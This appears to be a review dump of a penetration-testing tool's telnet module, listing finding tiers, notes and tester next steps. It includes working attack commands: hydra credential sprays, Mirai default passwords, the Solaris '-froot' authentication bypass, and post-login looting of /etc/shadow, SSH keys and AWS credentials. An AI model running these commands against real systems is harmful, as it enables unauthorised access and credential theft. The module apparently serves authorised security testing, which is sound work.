summary: Telnet module is the tranche's most complete: T0 presence-is-the-finding, T1 posture (no ENCRYPT offered, sniff runbook, TLS/AYT disambiguation), T2 pre-auth information disclosure (NEW-ENVIRON leak, NTLM AV_PAIR harvest, ENVIRON RFC1408 codes handled), T0 vendor+banner fingerprint (Cisco/BusyBox/Solaris/HP-UX/Juniper/…), T0 known-bad CVE banner match (Solaris in.telnetd -f, netkit encrypt_keyid, BusyBox hardcoded), and — gated by RECCE_ACTIVE_ATTACKS=1 — T3/T4 attempts: vendor-conditioned default-cred sweep + Solaris CVE-2007-0882 -f auth-bypass primitive + timing-based user-enum. Feeds cleartext_creds and known_vendors. Biggest gap: no credentialed follow-through (post-auth `show version` / `uname -a` harvest) — findings mention 'cred_captures' but analyze never populates it.

findings.tier_evidence: Always fires when telnet port matches — enum-only.
findings.promotion_notes: Sibling findings (sniff_runbook, no_encrypt, vendor_fingerprint) are the promotion channels.
findings.tester_next_step: tcpdump -i <iface> -A 's tcp port 23 and host IP' on the segment; any operator login leaks creds.

findings.tier_evidence: IAC WILL/DO options recorded — informational fingerprint.
findings.promotion_notes: Feeds telnet_vendor_fingerprint and default-cred sweep dispatch.
findings.tester_next_step: telnet IP 23 ; observe IAC options; use for vendor-specific follow-up.

findings.tier_evidence: IAC WILL/DO stream examined for OPT_ENCRYPT presence — enum-only.
findings.tester_next_step: wireshark on segment during login — every keystroke visible in clear.

findings.title_pattern: Telnet NEW-ENVIRON leaks env vars pre-auth (RFC 1572)
findings.tier_evidence: Server actually returned an IS payload with concrete USER/LOGNAME/DISPLAY/… values pre-auth — a real information-disclosure exploit result, not just an advertisement.
findings.promotion_notes: Feed leaked USER values into known_users so ssh/hydra sprays consume them; a landed pair is T3.
findings.tester_next_step: hydra -L leaked_users.txt -P rockyou.txt telnet://IP:23 -t 4 -f -w 5 ; also try ssh://IP with same list.

findings.tier_evidence: Banner regex to vendor slug — fingerprint.
findings.tester_next_step: telnet IP 23 — read banner ; consult vendor default-cred sheet ; try appropriate defaults with active_attacks=True

findings.title_pattern: Solaris in.telnetd -f / netkit encrypt_keyid / BusyBox hardcoded
findings.tier_evidence: Regex on banner text against _KNOWN_BAD table — version-gated CVE claim, no exploit fired yet.
findings.promotion_notes: Solaris path is already covered by telnet_solaris_dashf_rce (T3 when active_attacks fires). BusyBox path can be added: try root:xc3511/root:vizxv/etc from the Mirai list.
findings.tester_next_step: For SunOS 5.10: telnet -l -froot IP ; for BusyBox/embedded: try root:xc3511, root:vizxv, root:root; for netkit CVE-2020-10188: search github for encrypt_keyid PoC.

findings.tier_evidence: Only fires when the gated try_login('-froot','') actually reached a shell prompt (_PROMPT_RX matched, no _FAIL_RX) — an actual root foothold.
findings.promotion_notes: Run post-auth harvest (uname -a; cat /etc/passwd; cat /etc/shadow; find / -name id_rsa) to escalate to key material — currently stubbed by pr.get('cred_captures') never populated.
findings.tester_next_step: telnet -l -froot IP ; then: uname -a; id; cat /etc/shadow; find / -name id_rsa -o -name .aws 2>/dev/null; cp /var/adm/messages loot/

findings.tier_evidence: Fires only when the gated default-cred sweep actually landed a shell prompt — proven foothold.
findings.promotion_notes: Spray the same pair against SSH/HTTP-admin/SNMP/FTP on this host and the whole segment (embedded devices share creds). Post-auth: show running-config for Cisco / uname+/etc/shadow for BusyBox.
findings.tester_next_step: hydra -l <user> -p <pass> ssh://IP,http-get://IP/,snmp://IP,ftp://IP ; on device: 'show running-config | inc snmp|enable secret|username' (Cisco) or wget backup

findings.title_pattern: Telnet credentialed shell — host identity captured
findings.tier_evidence: Fires only when pr['cred_captures'] populated — but analyze() never populates it. Dead-code path currently.
findings.promotion_notes: Implement post-auth capture after a successful default-cred hit (run 'id; uname -a; hostname; cat /etc/passwd') and feed known_users / known_hostnames.
findings.tester_next_step: After telnet_default_creds hit: telnet -l <user> IP + send: id; uname -a; hostname; cat /etc/passwd — feed output into known_users.

findings.title_pattern: Telnet login-prompt timing distinguishes valid users
findings.tier_evidence: Wall-clock differential vs baseline dummy users: 30% elapsed threshold — deterministic user-existence oracle. But not wired into analyze() — only exposed via timing_user_enum().
findings.promotion_notes: Wire timing_user_enum() into analyze() behind active_attacks, feed known_users, then spray via try_login for T3.
findings.tester_next_step: Call recce.services.telnet.timing_user_enum manually with a candidate list; feed valid= users to hydra -L <file> -P rockyou.txt telnet://IP.

findings.tier_evidence: Actual NTLMSSP CHALLENGE_MESSAGE bytes located in OPT_AUTH subneg and AV_PAIRs parsed for concrete NetBIOS/DNS/computer/domain/tree/timestamp — a real disclosure primitive.
findings.promotion_notes: Feed nb_domain/dns_domain into known_domains, dns_computer into known_hostnames for AD/kerbrute/SMB downstream; timestamp bounds pass-the-hash windows.
Not exploitable directly; still cleartext-inside-TLS same weak-auth issues apply once wrapper stripped.
findings.tester_next_step: openssl s_client -connect IP:992 — then interact as normal telnet.

findings.title_pattern: Telnet on-path capture yields creds in cleartext
findings.tier_evidence: Chain finding — always fires for open telnet; not a probe result.
findings.tester_next_step: tcpdump -i any -A -s0 'tcp port 23 and host IP' ; strings capture.pcap | grep -i -E 'user|pass|login'

findings.title_pattern: Telnet peer confirmed via IAC AYT
findings.tester_next_step: telnet IP 23 ; ^] ; send ayt — expect a text response
